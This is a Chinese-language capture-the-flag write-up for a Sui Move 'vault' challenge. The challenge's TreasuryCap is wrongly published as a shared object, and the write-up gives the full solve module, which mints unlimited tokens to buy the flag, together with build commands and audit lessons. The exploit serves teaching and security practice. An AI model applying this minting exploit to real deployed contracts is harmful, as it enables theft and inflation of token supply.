# vault

## 题目简述

这是一道 Sui Move capability 误暴露题。Vault 要求用户先领取空投，再提交至少 `100_000_000_000` 单位 `VAULT_COIN` 才会生成 `Flag` 对象；正常空投只有 `5_000_000_000`，而部署时铸造的 `95_000_000_000` 初始代币属于部署者。

漏洞不在份额计算，而在 `vault_coin::init`：代表唯一铸币权限的 `TreasuryCap<VAULT_COIN>` 被发布成 shared object。任何交易都能取得它的可变引用，并调用公开的 `coin::mint` 任意增发。

## 解题过程

### 1. 梳理资产和权限流

`vault_coin.move` 创建币种后执行：

```move
let (mut treasury_cap, metadata) = coin::create_currency(...);
let initial_coin = coin::mint(&mut treasury_cap, 95_000_000_000, ctx);
transfer::public_transfer(initial_coin, sender);
transfer::public_share_object(treasury_cap);
```

`TreasuryCap<T>` 不是普通余额，而是 `T` 的铸币 authority。把它 share 后，攻击者自己的模块可以声明参数 `&mut TreasuryCap<VAULT_COIN>`，由交易把同一个共享对象传入，再调用 `coin::mint`。这等价于把增发权限公开，而不是只把代币公开。

`buy_flag` 的检查是：

```move
assert!(
    coin::value(&proof_coin) >= 100_000_000_000 &&
    vec_set::contains(&tracker.recipients, &sender),
    E_INSUFFICIENT_PROOF
);
```

因此还要满足“领取过空投”这一状态条件。直接任意铸币只能解决金额门槛，不能跳过 `tracker.recipients` 检查。

### 2. 编写 solve 模块

框架会将共享的 `Vault`、`AirdropTracker` 和 `TreasuryCap` 作为对象参数传给 `solution::solve`。完整利用代码为：

```move
module solution::solution {
    use sui::coin::{Self, Coin, TreasuryCap};
    use sui::tx_context::TxContext;

    use challenge::vault::{Self, AirdropTracker, Vault};
    use challenge::vault_coin::VAULT_COIN;

    const FLAG_TARGET: u64 = 100_000_000_000;

    public fun solve(
        vault: &mut Vault,
        tracker: &mut AirdropTracker,
        treasury_cap: &mut TreasuryCap<VAULT_COIN>,
        ctx: &mut TxContext
    ) {
        vault::request_airdrop(tracker, treasury_cap, ctx);
        let proof_coin: Coin<VAULT_COIN> =
            coin::mint(treasury_cap, FLAG_TARGET, ctx);
        vault::buy_flag(tracker, vault, proof_coin, ctx);
    }
}
```

第一步 `request_airdrop` 把当前 `tx_context::sender` 加入 recipients，并把 50 亿空投币转给玩家；这枚空投币不必再找回来或合并。第二步利用共享 cap 额外铸造恰好 1000 亿作为 `proof_coin`。第三步调用 `buy_flag`，它消费 proof coin、存入 Vault，并把 `Flag { user: sender, flag: true }` 转给玩家。

### 3. 通过框架校验

客户端先编译 Move 模块，再把 `solution.mv` 发给题目服务：

```text
cd framework-solve/solve
sui move build
cd ..
cargo run --release
```

服务端以 `solver` 身份发布解题模块，按 `Vault → AirdropTracker → TreasuryCap` 的顺序传入三个对象并调用 `solve`。随后它取回新生成的 `Flag` 对象，调用 `vault::has_flag` 检查内部布尔值；通过后返回由部署环境配置的动态 flag。因此仓库没有一个可写死的静态 flag 字符串，成功证据是服务端出现 `Correct Solution!` 并返回本实例 flag。

## 方法总结

- Sui Move 审计要先画 capability 流，而不只看 Coin 流。`TreasuryCap`、AdminCap 等对象一旦被 share，任何人就可能把它作为参数传给自己的公开函数，权限检查会在对象可达性这一层失效。
- 读断言时要拆成所有必要条件。本题需要同时满足“余额 ≥ 1000 亿”和“sender 已领取空投”，所以正确顺序是先登记空投状态，再任意铸币购买。
- 框架题还要确认对象参数的实际顺序和最终验证对象。利用逻辑正确但 `solve` 签名不匹配，或只铸币却没有生成供 `has_flag` 检查的 `Flag` 对象，都不会通过服务端校验。
